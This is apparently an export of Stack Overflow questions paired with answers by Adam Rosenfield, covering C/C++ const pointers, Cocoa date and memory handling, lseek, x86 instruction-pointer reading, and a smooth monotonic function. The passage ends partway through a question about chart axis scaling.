","9530","Adam Rosenfield","<p>Just a guess, but a common question is why one can't convert an <code>int**</code> to a <code>const int**</code>, which at first appears to be reasonable (after all, you're just adding a <code>const</code>, which is normally ok).  The reason is that if you could do this, you could accidentally modify a <code>const</code> object:</p>

<pre><code>const int x = 3;
int *px;
const int **ppx = &amp;px;  // ERROR: conversion from 'int**' to 'const int**'
*ppx = &amp;x;  // ok, assigning 'const int*' to 'const int*'
*px = 4;    // oops, just modified a const object
</code></pre>

<p>It's a very non-intuitive result, but the only way to make sure that you can't modify a <code>const</code> object in this case (note how there are no typecasts) is to make line 3 an error.</p>

<p>You're only allowed to add <code>const</code> without a cast at the FIRST level of indirection:</p>

<pre><code>int * const *ppx = &amp;px;  // this is ok
*ppx = &amp;x;               // but now this is an error because *ppx is 'const'
</code></pre>

<p>In C++, it is impossible to modify a <code>const</code> object without using a typecast of some sort.  You'll have to use either a C-style cast or a C++-style <code>const_cast</code> to remove the <code>const</code>-ness.  Any other attempt to do so will result in a compiler error somewhere.</p>
"
"<p>I'm looking two do two things:</p>

<ol>
<li>Check if a week has gone by (based on the day of the week)</li>
<li>Check if a day has gone by (based on the date)</li>
</ol>

<p>I'm not sure what the best way to solve this is, since when comparing two NSDates (one at 1/1/09 at 21:30 and another at 1/2/09 at 00:30) I can't just see if 24 hours has gone by since in this case it hasn't. I can solve this by just getting the date 1/1/09 from the NSDate, but I'm unsure how to do this based on the documentation and google links that I saw. </p>

<p>For the other issue, I don't know how to know what day of the week it is given a date. I'd like to if 1/1/09 is a Tuesday, Monday, etc... Is there any library that let's you calculate this? This obviously needs to take into account leap years and a tons of other stuff... Maybe there's an objective-c library for this?</p>

<p>Thanks for any help!</p>
","9530","Adam Rosenfield","<p>You can use <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSCalendar_Class/Reference/NSCalendar.html#//apple_ref/occ/instm/NSCalendar/components:fromDate:""><code>components:fromData:</code></a> message of the <code>NSCalendar</code> class to get the individual date components:</p>

<pre><code>// Sunday = 1, Saturday = 7
int weekday = [[[NSCalendar currentCalendar] components:NSWeekdayCalendarUnit fromDate:theDate] weekday];
</code></pre>

<p>To compare two dates, just use the <a href=""http://developer.apple.com/documentation/Cocoa/Reference/Foundation/Classes/NSDate_Class/Reference/Reference.html#//apple_ref/occ/instm/NSDate/compare:""><code>compare:</code></a> message:</p>

<pre><code>switch([date1 compare:date2])
{
case NSOrderedSame:       /* they are the same date */ break;
case NSOrderedAscending:  /* date1 precedes date2 */ break;
case NSOrderedDescending: /* date2 precedes date1 */ break;
}
</code></pre>
"
"<p>I am trying to locate a set of source code that would allow me to open and read the contents of an Excel file on Linux from within a C program.</p>

<p>I dont really want to link it to OpenOffice SDK if I can find something that just does these two things.</p>

<p>carl</p>
","9530","Adam Rosenfield","<p>You can use <a href=""http://chicago.sourceforge.net/xlhtml/"" rel=""nofollow"">xlhtml</a> to convert the Excel files into HTML, and then use your favorite HTML parser to extract the cell data.</p>
"
"<p>I have a UIViewController which has a retainCount of 3 the moment I instantiate it. That stirs me as terribly incorrect. What's the best way of figuring out who bumped up the retainCount to 3? I'd imagine instantiating the object should give the pointer 1, then I suppose maybe pushing it onto the UINavigationController's stack might bump it up one (not sure about that though?), but the third.. is a mystery. </p>
","9530","Adam Rosenfield","<p>Don't ever rely on retain counts directly.  What's happened is that during the initialization process, some piece of code has <code>retain</code>ed and <code>autorelease</code>d the object.  Because you can't tell how many times an object has been <code>autorelease</code>d, you don't actually know what the <em>real</em> retain count is.</p>

<p>Retain counts should <em>only</em> be used as a debugging aid, <em>never</em> as program control flow.</p>

<p>As long as you follow all of the rules laid out in the <a href=""https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>, you won't have problems.</p>
"
"<p><code>lseek()</code> is supposed to return the position of the file descriptor.</p>

<p>The <a href=""http://developer.apple.com/DOCUMENTATION/DARWIN/Reference/ManPages/man2/lseek.2.html#//apple%5Fref/doc/man/2/lseek"" rel=""nofollow"">documentation</a> says:</p>

<blockquote>
  <p>Upon successful completion, lseek()
  returns the resulting offset location
  as measured in bytes from the
       beginning of the file.  Otherwise, a value of -1 is returned
  and errno is set to indicate the
  error.</p>
</blockquote>

<p>Trouble is, not even this works:</p>

<pre><code>#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
printf(""size off_t: %i\n"", sizeof(off_t));

off_t pos;
pos = lseek(file, (off_t)0, SEEK_CUR);
printf(""pos: %lli\n"", pos);

// same result for SEEK_SET and SEEK_END
pos = lseek(file, (off_t)2352, SEEK_CUR);
printf(""pos: %lli\n"", pos);
</code></pre>

<p>This gives me:</p>

<pre>
size off_t: 8
pos: 0
pos: 0
</pre>

<p>Why is this? Is there an alternative to find the current offset, using the raw I/O functions? (<code>read</code>, <code>open</code>, <code>lseek</code>, …)</p>

<p><strong>Edit 1:</strong></p>

<p>I tried to make the example simpler.</p>
","9530","Adam Rosenfield","<p>What kind of file is it?  Is it a pipe by any chance?  Because if it's anything but a regular file, chances are it doesn't support seeking:</p>

<blockquote>
  <p>The behavior of lseek() on devices which are incapable of seeking is implementation-defined. The value of the file offset associated with such a device is undefined.</p>
</blockquote>
"
"<p>I'm looking over Apple's sample application EditableDetailView, and noticed that in one of their controllers, they're setting an instance of NSString property with (nonatomic, copy). When would one use copy instead of retain? Is this so they can make a unique copy without affecting the existing data?</p>
","9530","Adam Rosenfield","<p>Yes, it's so that it can make a unique copy without affecting the existing data.  The synthesized setters essentially look like this:</p>

<pre><code>// For @synthesize(nonatomic, retain) foo:
- (void) setFoo(NSFoo *theFoo)
{
    [theFoo retain];  // retain new value
    [foo release];    // release old value, if any
    foo = theFoo;     // assign new value
}

// For @synthesize(nonatomic, copy) foo:
- (void) setFoo(NSFoo *theFoo)
{
    NSFoo* newFoo = [theFoo copy];  // make copy
    [foo release];  // release old value, if any
    foo = newFoo;   // assign new value
}
</code></pre>

<p>Note the order of operations here is important - the new value must be retained/copied before the old value is released, in case of self-assignment.  If you released first and then assigned the property to itself, you might deallocate the value by accident.  Also note that if the old value is <code>nil</code>, sending it a <code>release</code> message is ok, since sending a message to a <code>nil</code> object is explicitly allowed and does nothing.</p>

<p>The choice of retaining versus copying just determines whether or not the object's property shares the same value with what you're setting it to.  Consider the following code:</p>

<pre><code>// suppose the 'foo' property is declared 'retain' and the 'bar' property is
// declared 'copy'
NSFoo *foo = ...;
NSBar *bar = ...;
someObject.foo = foo;
someObject.bar = bar;
[foo changeInternalState];  // someObject.foo also changes, since it's the same object
[bar changeInternalState];  // someObject.bar does NOT change, since it's a copy
</code></pre>
"
"<p>From <a href=""http://en.wikipedia.org/wiki/Shannon%27s%5Fsource%5Fcoding%5Ftheorem"" rel=""nofollow"">Shannon's Source Coding Theorem</a> we know that the entropy of a compressed string is bounded by the entropy of the original string like so:</p>

<pre><code>H(X) &lt;= L &lt; H(X) + 1/N
</code></pre>

<p>where H(X) is entropy of the source string, N is the length of the source string, and L is the expected length of the compressed string.</p>

<p>This necessarily means that there is a limit to lossless compression.  </p>

<p>What I'd like to know is:</p>

<ul>
<li><p>Can we directly relate entropy to some expected compression ratio?  </p></li>
<li><p>Can we use the entropy to find some upper bound for the compression ratio?</p></li>
</ul>
","9530","Adam Rosenfield","<p>Shannon's Theorem is defined in terms of random data and probabilities.  Similarly, the <em>entropy</em> of a string is only defined for random strings -- the entropy is a property of the distribution, not of the strings themselves.  So, we can restate Shannon's Theorem informally as:</p>

<blockquote>
  <p>If you randomly select a string from a given probability distribution, then the best average compression ratio we can get for the string is given by the entropy rate of the probability distribution.</p>
</blockquote>

<p>Given any random string, I can easily write a compression algorithm which will compress that string down into 1 bit, but my algorithm will necessarily increase the length of some other strings.  My compression algorithm works as follows:</p>

<ol>
<li>If the input string equals <em>some pre-chosen random string</em>, the output is the 1-bit string ""0""</li>
<li>Otherwise, the output is the N+1-bit string of ""1"" followed by the input string</li>
</ol>

<p>The corresponding decompression algorithm is:</p>

<ol>
<li>If the input is ""0"", the output is <em>our previous pre-chosen random string</em></li>
<li>Otherwise, the output is everything except for the first input bit</li>
</ol>

<p>The key here is that we can't write down <em>one</em> algorithm which, for all strings from a given distribution, compresses them <em>all</em> at a high rate on average.  There's just too many strings.</p>

<p>If we have a given probability distribution of strings, we can calculate the entropy rate of the distribution, and then if randomly pick a string <em>according to the distribution</em> and attempt to compress it using <strong>any</strong> algorithm, the relative size of the compressed string will, on average, never be less than the entropy rate.  This is what Shannon's Theorem says.</p>
"
"<p>I am using C++ ofstream to write out a file. I want to set the permissions to be only accessible by the user: 700. In unix; I suppose I can just issue a system(""chmod 700 file.txt""); but I need this code to work on windows as well. I can use some windows api; but what is the best c++ cross platform way to do this?</p>
","9530","Adam Rosenfield","<p>You can't do it in a cross-platform manner.  In Linux, you should use the function <a href=""http://linux.die.net/man/2/chmod"" rel=""nofollow""><code>chmod(2)</code></a> instead of using <code>system(2)</code> to spawn a new shell.  On Windows, you'll have to use the various <a href=""http://msdn.microsoft.com/en-us/library/aa375742(VS.85).aspx"" rel=""nofollow"">authorization functions</a> to make an ACL (access-control list) with the proper permissions.</p>
"
"<p>I'm writing firmware in C for an embedded processor. I want to have all the configuration information in one header file called config.h. This is causing problems with the ADC initialization, where simple #defines won't do the trick. Right now the code is like so:</p>

<p>config.h</p>

<pre><code>#define NUMBER_OF_POTS  1
#define POT_1_CHANNEL  27
</code></pre>

<p>adc.c</p>

<pre><code>#define MAKE_CSS(channel) _CSS##channel
#define CALL_MAKE_CSS(channel) MAKE_CSS(channel)

void initialize_adc() {
   CALL_MAKE_CSS(POT_1_CHANNEL);
}
</code></pre>

<p>What I want to do is not have to touch adc.c if I change config.h to:</p>

<pre><code>#define NUMBER_OF_POTS  2
#define POT_1_CHANNEL  27
#define POT_2_CHANNEL  29
</code></pre>

<p>adc.c should just automatically add a second <code>CALL_MAKE_CSS</code> with some macro trickery.</p>

<p>I guess the question is: is there a trick that gives you for loop capability with a macro?</p>

<p>Thanks,</p>

<p>Steve.</p>
","9530","Adam Rosenfield","<p>The C preprocessor cannot do loops.  You'll either have to do the looping in C code, or if you <em>really</em> need to do something loop-like at compile time, you can write your own preprocessor (which can just be a simple shell script, e.g.) that generates the necessary code.</p>
"
"<p>Let's assume I'm creating a simple class to work similar to a C-style struct, to just hold data elements.  I'm trying to figure out how to search the list of objects for objects with a certain attribute.  Below is a trivial example to illustrate what I'm trying to do.</p>

<p>For instance:</p>

<pre><code>class Data:
    pass

myList = []

for i in range(20):
    data = Data()
    data.n = i
    data.n_squared = i * i
    myList.append(data)
</code></pre>

<p>How would I go about searching the myList list to determine if it contains an element with n == 5?</p>

<p>I've been Googling and searching the Python docs, and I think I might be able to do this with a list comprehension, but I'm not sure.  I might add that I'm having to use Python 2.4.3 by the way, so any new gee-whiz 2.6 or 3.x features aren't available to me.</p>

<p>Thanks!</p>
","9530","Adam Rosenfield","<p>You can get a list of <em>all</em> matching elements with a list comprehension:</p>

<pre><code>[x for x in myList if x.n == 30]  # list of all elements with .n==30
</code></pre>

<p>If you simply want to determine if the list contains <em>any</em> element that matches and do it (relatively) efficiently, you can do</p>

<pre><code>def contains(list, filter):
    for x in list:
        if filter(x):
            return True
    return False

if contains(myList, lambda x: x.n == 3)  # True if any element has .n==3
    # do stuff
</code></pre>
"
"<p>How does one set the ""Description"" property of an executable?  By this I mean the value displayed when you right-click an executable in Windows Explorer and it shows ""Description:"" with what seems to be just the name of the executable without the file extension.</p>

<p>I'm running GCC 3.4.5 (mingw-vista special r3) on Windows XP.</p>

<p>I have googled the heck out of this to no avail, but I have a feeling I might have to use a resource file with windres... am I on the right track at least?</p>

<p>I actually have been setting a custom name with -o, but I actually want a different one altogether.</p>
","9530","Adam Rosenfield","<p>That information is taken from a Version Info resource.  Windows executables can contain resource files embedded in them.  Normally, with Microsoft Visual Studio, you create a resource script (<code>.rc</code> file), and the Visual Studio resource compiler will compile it into the executable for you.  VS also contains a nice visual resource editor for editing the various types of resources (string tables, icons, bitmaps, cursors, menus, dialog boxes, version info, etc.).</p>

<p>With GCC, you'll have to create the resource script yourself.  See <a href=""http://msdn.microsoft.com/en-us/library/aa381058(VS.85).aspx"">MSDN</a> for more info on the <code>VERSIONINFO</code> resource type.  Once you've created a valid resource script, you can use <a href=""http://sourceware.org/binutils/docs/binutils/windres.html"">windres</a> to compile it into an object file (<code>.o</code>).  <a href=""http://fragglet.livejournal.com/4448.html"">This page</a> has a good example of how to do that.  Finally, once you have an object file, you just link it in with the rest of your object files as usual.</p>
"
"<p>I have an NSTimer which is setup like this:</p>

<pre><code>[NSTimer scheduledTimerWithTimeInterval:0.5 target:timerTarget selector:NSSelectorFromString(targetSelector) userInfo:nil repeats:YES];
</code></pre>

<p>How can I get the return value of the <code>timerTarget</code> method?</p>
","9530","Adam Rosenfield","<p>What are you doing with the return value?  The target is run asynchronously 0.5 seconds later.  The call to <code>scheduledTimerWithTimeInterval:target:selector:useInfo:repeats:</code> returns instantaneously, at which point the target has not been run.  If you really need the return value <em>right now</em>, then don't bother with a timer and just call the selector normally.</p>
"
"<p>Can the program counter on Intel CPU's can be read directly (that is without 'tricks') in kernel mode or some other mode?</p>

<p>Thanks :-).</p>
","9530","Adam Rosenfield","<p>There is no instruction to directly read the instruction pointer (EIP) on x86.  You can get the address of the current instruction being assembled with a little inline assembly:</p>

<pre><code>// GCC inline assembler; for MSVC, syntax is different
uint32_t eip;
__asm__ __volatile__(""movl $., %0"", : ""=r""(eip));
</code></pre>

<p>The <code>.</code> assembler directive gets replaced with the address of the current instruction by the assembler.  Note that if you wrap the above snippet in a function call, you'll just get the same address (within that function) every time.  If you want a more usable C function, you can instead use some non-inline assembly:</p>

<pre><code>// In a C header file:
uint32_t get_eip(void);

// In a separate assembly (.S) file:
.globl _get_eip
_get_eip:
    mov 0(%esp), %eax
    ret
</code></pre>

<p>This means each time you want to get the instruction pointer, it's slightly less efficient since you need an extra function call.  Note that doing it this way does not blow the return address stack (RAS).  The return address stack is a separate stack of return addresses used internally by the processor to facilitate <a href=""http://en.wikipedia.org/wiki/Branch_target_predictor"" rel=""nofollow"">branch target prediction</a> for RET instructions.</p>

<p>Every time you have a CALL instruction, the current EIP gets pushed onto the RAS, and every time you have a RET instruction, the RAS is popped, and the top value is used as the branch target prediction for that instruction.  If you mess up the RAS (such as by not matching each CALL with a RET, as in <a href=""http://stackoverflow.com/questions/599968/reading-program-counter-directly/599982#599982"">Cody's solution</a>), you're going to get a whole bunch of unnecessary branch mispredictions, slowing your program down.  This method does not blow the RAS, since it has a matched pair of CALL and RET instructions.</p>
"
"<p>I need a cmd script that deletes the first line in my text file. The scenario is the following: I take a txt file from FTP everyday, the problem is that it comes with blank line at the top then the headers of the file. Since I'm importing that file automatically into an access table, that blank line is causing me problems.</p>

<p>So, I need a script that deletes the blank line and saves the file.</p>
","9530","Adam Rosenfield","<p>You didn't specify a platform.  Here's how to do it in any *NIX environment (and Windows+Cygwin):</p>

<pre><code>sed -i~ 1d target-file
</code></pre>
"
"<p>I tried to compile my program, with Code::Blocks (gcc compiler). And I get an error: Here is the source file it complaining about:</p>

<pre><code>#ifndef BOT_H
#define BOT_H

#include ""player.h""
#include ""timer.h""

class BOTS; // forward decalaration of BOTS

class BOT : public PLAYER
{
public:
    enum BotStatus{BotMoving,BotPursue,BotChasePowerup};
    enum BotMovDir{Up,Down,Left,Right,Forward,Backward};
    enum BotSkill{Easy,Normal,Hard,Expert,Insane};
protected:
    BotStatus Status;  // this is the line it complaining about
    BotMovDir CurrentMov;
    TIMER CTimer;
    bool Stucked;
    BotSkill Skill;
    VECTOR3D AimTarget;
//  VECTOR3D ShotTarget;
    PLAYER *PursueObj;
    bool SameLevel;
    BOTS *Owner;
    bool PlayerHitMe;
    void OnDamage(double dmg,const wchar_t *Shooter,bool s);
    void OnReset();
public:
    BOT(BOTS *o,const wchar_t *botname) : PLAYER(botname), PlayerHitMe(false), Status(BotMoving), Skill(Easy), Owner(o)
    {
        PlayerInit();
    }
    void SetSkill(BotSkill bs) {Skill=bs;}
    void BotControl();
    void SetSameLevel(bool s) {SameLevel=s;}
    virtual ~BOT() {}
};

#endif
</code></pre>

<p>It complains about the 16th line ""multiple types in one declaration"" and it is driving me crazy. I googled a lot, but the common solution is ""find the missing semicolon"". And the problem is that there is no missing semicolon at all. It always point to the 16th line (at least after the protected) even if there is a comment or even it is beyond the eof (when I remove all fields so the file become small).</p>

<p>(This problem might be trivial and I may be tired now, so I must have a sleep. And I hope someone will have given me some advice by morning tomorrow. )</p>
","9530","Adam Rosenfield","<p>The file you have shown us is a <em>header</em> file.  The problem you're having is on the 16th line of some <em>source</em> file which is <code>#include</code>ing that header.  Can you copy+paste the <strong>exact</strong> error message you're receiving, as well as the relevant portion of the file referenced in the error message?</p>
"
"<p>I appear to have some overzealous releasing going on in my obj-C app - getting error message </p>

<blockquote>
  <p>""-[myobj release]: message sent to deallocated instance 0x5633b0""</p>
</blockquote>

<p>.  I know the class of the object instance causing the problem, but this class is used all over to create many instances.</p>

<p>My thought is I could put some logging in the init method of the class to log whatever ""0x5633b0"" corresponds to which should help me track down where the instance is being created.</p>

<p>What exactly is the ""0x5633b0"" and is there any way I can get access to that value in the code to log it?</p>

<p>Thanks.</p>
","9530","Adam Rosenfield","<p>You're not managing your memory properly -- you're calling <code>release</code>/<code>autorelease</code> on some object more times than you're calling <code>retain</code>.  Make sure you're following all of the rules laid out in the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/MemoryMgmt.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a>.</p>

<p>0x5633b0 is just the address of the memory location at which the object is stored.  One thing you can try to do is to add some code to the <code>init</code> method:</p>

<pre><code>- (void) init
{
    if(self == (MyClass*)0x5633b0)
        NSLog(@""Allocated object at address 0x5633b0"");  // put a breakpoint on this line
    // do rest of init...
}
</code></pre>

<p>If you have any other <code>init</code> methods (e.g. <code>initWithCoder:</code>, which is called for objects instantiated from a XIB), make sure to put this snippet in those methods as well.  Put a breakpoint on the <code>NSLog</code> line, and then see when it gets hit.  Note that it may get hit several times, if an object is allocated at that address, deallocated, and then another object happens to be reallocated at the same address.  The last hit before the crash is the one you want.</p>
"
"<p>I'm looking for a window... ugh... thing for OpenGL, I've been using SDL but more recently found that its not quite up to my needs in at least any code I've seen. I'd like to find some GUI library that allows me to develop using OpenGL (and SDL if at all possible) with a menu bar, possibly options at the side, and a working-out-of-the-box close button. Qt is the sort of thing I'm looking for, but I'd like to work with something that doesn't force me to make it open source.</p>

<p>A quick list of things I want, a working close button, ability to use OGL, cross platform, any licence that doesn't force me to become open source, free, and the ability to go full screen and change resolution on the fly.</p>

<p>I have searched myself, I'm not a lazy person really ;) I just want to get some opinions here before I dive off into anything and find its not really suitable for my needs.</p>

<p>Thanks in advance for any feedback.</p>
","9530","Adam Rosenfield","<p><a href=""http://www.opengl.org/resources/libraries/glut/"" rel=""nofollow"">GLUT</a> (GL Utility Toolkit) comes close to what you're looking for.  It's quick and easy and cross-platform, although it does not have support for menu bars.  <a href=""http://www.opengl.org/resources/libraries/windowtoolkits/"" rel=""nofollow"">This page</a> also has a number of GLUT-like alternatives.</p>
"
"<p>Is there a way to construct a self-referential data structure (say a graph with cycles) in lisp or scheme? I'd never thought about it before, but playing around I can find no straightforward way to make one due to the lack of a way to make destructive modification. Is this just an essential flaw of functional languages, and if so, what about lazy functional languages like haskell?</p>
","9530","Adam Rosenfield","<p>In Scheme, you can do it easily with <code>set!</code>, <code>set-car!</code>, and <code>set-cdr!</code> (and anything else ending in a bang (<code>'!'</code>), which indicates modification):</p>

<pre><code>(let ((x '(1 2 3)))
  (set-car! x x)
  ; x is now the list (x 2 3), with the first element referring to itself
  )
</code></pre>
"
"<p>I have a UITableViewController, which is RootViewController.  It's XIB only has a table view.  I've add a UIActivityIndicator through IB and created an IBOutlet.  I've programmatically added a toolbar with a delete button to the RootViewController.  When the user clicks the toolbar's delete button, I want to display the indicator, centered on the screen.   The method below deletes data from a database, which happens very fast.  I want to let the user know something is happening.  If I run the code below without sleep(), it happens to fast and I don't see the indicator.  But some for some reason, I'm not seeing the indicator anyways.  I'm guessing sleep() blocks repainting?  If I take out sleep() and the last two lines, I see the indicator but of course it never goes away.  It also displays in the top left of the window.</p>

<p>How do I get the code below to work so that the indicator displays for 1/2 - 1 second at least?</p>

<p>How do I align the indicator in the middle of the window?</p>

<pre><code>[self.navigationController.view addSubview:activityIndicator];
[activityIndicator startAnimating];
[activityIndicator setNeedsDisplay];

//do something which might happen really fast

sleep(1); //create illusion
[activityIndicator stopAnimating];
[activityIndicator removeFromSuperview];
</code></pre>
","9530","Adam Rosenfield","<p>The problem is that while you're doing your thing, the main run loop isn't running.  In order for the activity indicator to display, the main run loop needs to be running so it can update its animation.  In order to get the intended behavior, you'll need to do your database operation asynchronously in a separate thread.</p>
"
"<p>Will the array be deallocated and if so, what is a workaround?</p>

<pre><code>double * GetArrayFromVector( std::map&lt;std::string, double&gt; m, char ** names, int count )
{ 
    if(!names) return 0;

    std::vector&lt;double&gt; vec(m.size());
    for (int i=0; i&lt;count; ++i)
    { 
       if(!names[i]) return 0;
       std::map&lt;std::string, double&gt;::iterator iter=m.find(name[i]);
       if(iter!=m.end())
          vec.push_back(iter-&gt;second);
       else
         return 0;   
    }

    return &amp;vec[0]; 
}
</code></pre>

<p>Thanks a lot</p>
","9530","Adam Rosenfield","<p>Yes -- it's deallocated as soon as your return from the function, because <code>vec</code> is declared on the stack.  The <code>std::vector</code> destructor takes care of freeing the memory.  Since you're returning the address of a deallocated array, you're going to start messing around with deallocated memory, which is a big no-no.  At best, you'll crash immediately.  At worst, you'll silently succeed with a big gaping security hole.</p>

<p>There are two ways to fix this: (1) return the entire vector by-value, which makes a copy of the entire vector, or (2) return the vector via a reference parameter.</p>

<p>Solution 1:</p>

<pre><code>std::vector&lt;double&gt; GetArrayFromVector(...)
{
    ...
    return vec;  // make copy of entire vec, probably not a good idea
}
</code></pre>

<p>Solution 2:</p>

<pre><code>void GetArrayFromVector(..., std::vector&lt;double&gt; &amp; vec)
{
    // compute result, store it in vec
}
</code></pre>
"
"<p>Suppose I have a set of functions and classes which are templated to use single (<code>float</code>) or <code>double</code> precision. Of course I could write just two pieces of bootstrap code, or mess with macros. But can I just switch template argument at runtime?</p>
","9530","Adam Rosenfield","<p>No, you can't switch template arguments at runtime, since templates are instantiated by the compiler at compile-time.  What you <em>can</em> do is have both templates derive from a common base class, always use the base class in your code, and then decide which derived class to use at runtime:</p>

<pre><code>class Base
{
   ...
};

template &lt;typename T&gt;
class Foo : public Base
{
    ...
};

Base *newBase()
{
    if(some condition)
        return new Foo&lt;float&gt;();
    else
        return new Foo&lt;double&gt;();
}
</code></pre>

<p>Macros have the same problem as templates, in that they are expanded at compile-time.</p>
"
"<p>I'm trying to track down the bottleneck in an IPhone OpenGL game I'm writing. The game itself is in 2d, and contains a couple hundred textured sprites, each alpha blended.</p>

<p>In terms of textures, I only use a single 512x512 atlas that I bind once, so I don't think its a bandwidth issue (at least not from the upload of textures).</p>

<p>I used instruments to track the CPU usage, memory usage and OpenGL ES usage. At a heavy point in the game, I was getting seeing the following:</p>

<p>FPS: 20
CPU: 60%
Real Mem: 17Mb
Tiler utilisation : 21%
Rendered utilisation : 45%</p>

<p>I'm a little confused as to what could be the bottleneck? How high can the CPU usage go (I'm aware that there are other applications running at the same time) before it becomes the bottleneck? Does 60% sound about right?</p>

<p>Or could it be the amount of graphics? I'm guessing not if the tiler + renderer utilisation are that low down. But I must confess I'm not expert in reading these results.</p>

<p>Any pointers on either what my likely bottleneck is, or where else to look for one would be gratefully received!</p>
","9530","Adam Rosenfield","<p>If you haven't already, read through <a href=""http://developer.apple.com/iphone/library/technotes/tn2008/tn2230.html"" rel=""nofollow"">Optimizing OpenGL ES for iPhone OS</a>, it's got a lot of useful tidbits on how to write speedy OpenGL applications on the iPhone.</p>
"
"<p>Please note: by a ""pure"" function, I don't mean ""pure virtual""<br />
I'm referring to <a href=""http://en.wikipedia.org/wiki/Pure%5Ffunction"" rel=""nofollow"">this</a></p>

<p>If a function ""reads"" some global state, does that automatically render it impure? or does it depend on other factors?</p>

<p>If it automatically renders it impure, please explain why.</p>

<p>If it depends on other factors, please explain what are they.</p>
","9530","Adam Rosenfield","<p>In certain specialized instances, yes.  For example, if you had a global cache of already-computed values that was only read and written by your function, it would still be mathematically pure, in the sense that the output only depended on the inputs, but it wouldn't be pure in the strictest sense.  For example:</p>

<pre><code>static int cache[256] = {0};
int compute_something(uint8_t input)
{
    if(cache[input] == 0)
        cache[input] = (perform expensive computation on input that won't return 0);
    return cache[input];
}
</code></pre>

<p>In this case, so long as no other function touches the global <code>cache</code>, it's still a mathematically pure function, even though it technically depends on external global state.  However, this state is just a performance optimization -- it would still perform the same computation without it, just more slowly.</p>
"
"<p>This is for a 2D game so there are only an x and y axis. The game is in landscape mode on the iPhone. I wish to be able to set the screen x and y coordinates of where to render a texture.</p>
","9530","Adam Rosenfield","<p>If you're doing a 2D game, you can set up your projection and model-view matrices so that you don't need to convert at all:</p>

<pre><code>// This goes in your init code somewhere
// Set up 480x320 orthographic projection
glMatrixMode(GL_PROJECTION);
glLoadIdentity();
glOrthof(-240.0f, 240.0f, -160.0f, 160.0f, -1.0f, 1.0f);

// Rotate into landscape mode
glMatrixMode(GL_MODELVIEW);
glLoadIdentity();
glRotatef(-90.0f, 0.0f, 1.0f, 0.0f);
</code></pre>

<p>This makes it so that world coordinates (-240, -160) maps to the top-left of the screen (bottom-left in landscape mode), (240, 160) maps to the bottom-right (top-right in landscape), etc.  Since the iPhone's screen is 480x320, you won't need to convert between world and screen coordinates with your matrices set up thusly.</p>

<p>Of course, if you want to be able to move the camera, then you'll need to offset by the camera's location.</p>
"
"<p>I have a little math problem. I would like to have a function with these properties:</p>

<ol>
<li>for x much bigger than 0:  lim f(x) = x</li>
<li>for x much smaller than 0: lim f(x) = 0</li>
<li>and f(0) = 1 <em>(sorry, I had here f(1)=1 which was wrong!)</em></li>
<li>f(x) should be <a href=""http://en.wikipedia.org/wiki/Monotonic%5Ffunction"" rel=""nofollow"">monotonically increasing</a></li>
</ol>

<p>So the function should look somewhat like this:</p>

<pre><code>        ^
        |   /
        |  /
        | /
   ___.-+´
--´-----+------&gt;
        |
</code></pre>

<p>The best I got so far is <code>x/(1 + e^(-x))</code> but then I recognized that it drops below 0 and is not monotonically increasing. </p>

<p>A great help for playing around with these function is <a href=""http://graph.seriesmathstudy.com/"" rel=""nofollow"">GraphFunc Online</a>.</p>

<p>Also, it would be helpful if the function is fast to calculate as I need to execute it very often.</p>

<p><strong>EDIT</strong>: I am using this in a program to limit values. I have an optimization algorithm, that uses curve fitting with a <a href=""http://en.wikipedia.org/wiki/Levenberg-Marquardt%5Falgorithm"" rel=""nofollow"">Levenberg-Marquardt</a> algorithm. But this algorithm does not allow constraints, and optimizes over the full range of real values. So I need a function like this so that I can add an artificial constraint so that the function is bigger than 0. A simple approach would be to use <code>f(x) = x²</code> but then the function is not monotonically increasing and it has two minimas. </p>

<p>The Levenberg-Marquardt approximates derivatives, so I think it would be best when the function is smooth too. But I am not sure if this is absolutely necessary.</p>
","9530","Adam Rosenfield","<p>Here's a <a href=""http://en.wikipedia.org/wiki/Smooth%5Ffunction"" rel=""nofollow"">smooth function</a> that satisfies your requirements:</p>

<pre><code>f(x) = (x + sqrt(x^2 + 4)) / 2
</code></pre>

<p>For x = 0, you can see that f(x) = 1.  For very large positive x, <code>sqrt(x^2 + 4)</code> is approximately x, so f(x) ≈ x.  For very large negative x, <code>sqrt(x^2 + 4)</code> is approximately -x, so f(x) ≈ 0.</p>

<p>The first derivative is</p>

<pre><code>f'(x) = 1/2 + 1/2*x/sqrt(x^2 + 4)
</code></pre>

<p>For x > 0, <code>x/sqrt(x^2 + 4) &gt; 0</code>, so f'(x) > 0.  For x &lt; 0,</p>

<pre><code>0 &lt; x^2/(x^2 + 4) &lt; 1
0 &lt; |x|/sqrt(x^2 + 4) &lt; 1
-1 &lt; x/sqrt(x^2 + 4) &lt; 0
-1/2 &lt; 1/2*x/sqrt(x^2 + 4) &lt; 0
1/2 + 1/2*x/sqrt(x^2 + 4) &gt; 0
</code></pre>

<p>Hence, f'(x) > 0 for all x, so f(x) is monotonically increasing as desired.</p>
"
"<p>I need to make a chart with an optimized <em>y</em> axis maximum value. </p>

<p>The current method I have of making charts simply uses the maximum value of all the graphs, then divides it by ten, and uses that as grid lines. I didn't write it.</p>

<p><strong>Update Note:</strong> These graphs have been changed. As soon as I fixed the code, my dynamic graphs started working, making this question nonsensical (because the examples no longer had any errors in them). I've updated these with static images, but some of the answers refrence different values. Keep that in mind.
<img src=""http://i42.tinypic.com/nwzr5s.jpg"" alt=""alt text"">
There were between 12003 and 14003 inbound calls so far in February. Informative, but ugly.</p>

<p>I'd like to avoid charts that look like a monkey came up with the <em>y</em>-axis numbers.</p>

<p>Using the Google charts API helps a little bit, but it's still not quite what I want.
